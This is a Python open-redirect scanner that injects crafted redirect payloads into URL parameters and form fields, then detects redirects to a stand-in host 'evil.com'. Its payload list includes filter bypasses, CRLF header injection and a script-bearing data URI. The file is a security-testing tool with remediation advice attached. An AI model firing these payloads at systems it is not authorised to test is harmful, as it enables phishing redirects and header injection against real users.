"""
Open Redirect Scanner - Production Grade
Techniques: Location header, Meta refresh, JS redirect, Header injection,
Bypass techniques (double slash, @, encoded chars, subdomain)
"""
import requests, time, re
from urllib.parse import urlparse, parse_qs, quote

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
}

REDIRECT_PARAMS = {
    "redirect","redirect_to","redirect_url","redirecturl","redirect_uri",
    "url","next","return","return_url","returnurl","return_to","returnto",
    "goto","dest","destination","target","redir","redir_to","redir_url",
    "forward","forward_to","continue","callback","success_url","cancel_url",
    "after_login","after_signup","after","back","backurl","back_url",
    "ref","referer","referrer","href","link","location","go","jump",
    "out","exit","away","leave","transfer","move",
}

ATTACKER_DOMAIN = "evil.com"
TRUSTED_DOMAIN  = "trusted.com"

REDIRECT_PAYLOADS = [
    # Direct
    (f"https://{ATTACKER_DOMAIN}",                    "direct_https"),
    (f"http://{ATTACKER_DOMAIN}",                     "direct_http"),
    # Protocol-relative
    (f"//{ATTACKER_DOMAIN}",                          "protocol_relative"),
    (f"////{ATTACKER_DOMAIN}",                        "quad_slash"),
    # Backslash bypass
    (f"/\\{ATTACKER_DOMAIN}",                         "backslash"),
    (f"\\\\{ATTACKER_DOMAIN}",                        "double_backslash"),
    # URL encoding bypass
    (f"https://{quote(ATTACKER_DOMAIN, safe='')}",   "url_encoded"),
    (f"%2F%2F{ATTACKER_DOMAIN}",                      "encoded_slashes"),
    # @ symbol bypass (user@host — goes to host)
    (f"https://{TRUSTED_DOMAIN}@{ATTACKER_DOMAIN}",  "at_sign"),
    (f"https://{TRUSTED_DOMAIN}:{TRUSTED_DOMAIN}@{ATTACKER_DOMAIN}", "at_cred"),
    # Subdomain confusion
    (f"https://{ATTACKER_DOMAIN}.{TRUSTED_DOMAIN}",  "subdomain_confuse"),
    (f"https://{TRUSTED_DOMAIN}.{ATTACKER_DOMAIN}",  "reversed_subdomain"),
    # Parameter pollution
    (f"https://{ATTACKER_DOMAIN}?{TRUSTED_DOMAIN}",  "param_pollution"),
    # Hash bypass
    (f"https://{ATTACKER_DOMAIN}#{TRUSTED_DOMAIN}",  "hash_bypass"),
    (f"https://{TRUSTED_DOMAIN}#{ATTACKER_DOMAIN}",  "hash_trust_bypass"),
    # CRLF / header injection
    (f"%0d%0aLocation: https://{ATTACKER_DOMAIN}",   "crlf_header"),
    (f"\r\nLocation: https://{ATTACKER_DOMAIN}",     "crlf_raw"),
    # Unicode bypass
    (f"https://{ATTACKER_DOMAIN}%E2%80%8B",          "zero_width"),
    # Data URI
    (f"data:text/html,<script>location='{ATTACKER_DOMAIN}'</script>", "data_uri"),
]

def detect_redirect(response, payload):
    """Multi-method redirect detection."""

    # Method 1: Location header (most reliable)
    loc = response.headers.get("Location","")
    if ATTACKER_DOMAIN in loc:
        return True, f"HTTP {response.status_code} redirect via Location header → {loc[:80]}"

    # Method 2: CRLF header injection — check if evil header appeared
    if ATTACKER_DOMAIN in str(response.headers):
        return True, f"Header injection — {ATTACKER_DOMAIN} appeared in response headers"

    # Method 3: Meta refresh
    meta_match = re.search(
        r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\'][^"\']*url\s*=\s*([^"\'>\s]+)',
        response.text, re.IGNORECASE)
    if meta_match and ATTACKER_DOMAIN in meta_match.group(1):
        return True, f"Meta refresh redirect → {meta_match.group(1)[:80]}"

    # Method 4: JavaScript redirect
    js_patterns = [
        rf'(window\.location|location\.href|location\.replace|location\.assign)\s*[=(]\s*["\']https?://{re.escape(ATTACKER_DOMAIN)}',
        rf'document\.location\s*=\s*["\']https?://{re.escape(ATTACKER_DOMAIN)}',
    ]
    for pat in js_patterns:
        if re.search(pat, response.text, re.IGNORECASE):
            return True, f"JavaScript redirect to {ATTACKER_DOMAIN}"

    return False, None

def is_redirect_param(name):
    return name.lower() in REDIRECT_PARAMS or \
           any(k in name.lower() for k in ["redirect","return","next","goto","url","dest"])

def test_redirect(method, url, base_data, param, timeout=8):
    findings = []

    # Baseline
    try:
        r0 = requests.request(method, url,
                             **{"data" if method=="POST" else "params": base_data},
                             headers=HEADERS, timeout=timeout,
                             verify=False, allow_redirects=False)
        baseline_loc = r0.headers.get("Location","")
    except:
        baseline_loc = ""

    for payload, ptype in REDIRECT_PAYLOADS:
        d = base_data.copy(); d[param] = payload
        try:
            r = requests.request(method, url,
                                **{"data" if method=="POST" else "params": d},
                                headers=HEADERS, timeout=timeout,
                                verify=False, allow_redirects=False)

            # Skip if same as baseline
            if r.headers.get("Location","") == baseline_loc and \
               ATTACKER_DOMAIN not in r.text:
                time.sleep(0.05); continue

            vuln, reason = detect_redirect(r, payload)
            if vuln:
                findings.append({
                    "vuln_type": "Open Redirect",
                    "url": url, "parameter": param,
                    "payload": payload, "severity": "Medium",
                    "description": (
                        f"Open redirect in '{param}' via {method}. "
                        f"Bypass technique: {ptype.replace('_',' ')}. "
                        f"{reason}. Attackers can redirect users to phishing sites."
                    ),
                    "recommendation": (
                        "1. Maintain a strict whitelist of allowed redirect destinations. "
                        "2. Use relative paths only (never absolute URLs from user input). "
                        "3. Validate redirect URL against whitelist AFTER URL decoding. "
                        "4. Show a redirect warning page before external redirects. "
                        "5. Never use user-supplied values in Location headers directly."
                    )
                })
                return findings
        except: pass
        time.sleep(0.05)
    return findings

def run_redirect_scan(crawl_data, timeout=8):
    findings, seen = [], set()

    for page in crawl_data:
        # URL params
        parsed = urlparse(page["url"])
        qs = {k: v[0] for k,v in parse_qs(parsed.query).items()}
        redirect_params = [k for k in qs if is_redirect_param(k)]

        if redirect_params:
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param in redirect_params[:3]:
                key = f"{base_url}:{param}"
                if key in seen: continue
                for f in test_redirect("GET", base_url, qs, param, timeout):
                    seen.add(key); findings.append(f)

        # Forms
        for form in page.get("forms",[]):
            action = form.get("action") or page["url"]
            method = form.get("method","GET").upper()
            redirect_inputs = [i for i in form.get("inputs",[])
                              if i.get("name") and is_redirect_param(i["name"])
                              and i.get("type","text") not in ["submit","button","hidden"]]
            if not redirect_inputs: continue

            base_data = {i["name"]: i.get("value") or "http://example.com"
                        for i in form.get("inputs",[]) if i.get("name")}
            for inp in redirect_inputs[:2]:
                key = f"{action}:{inp['name']}"
                if key in seen: continue
                for f in test_redirect(method, action, base_data, inp["name"], timeout):
                    seen.add(key); findings.append(f)

    return findings
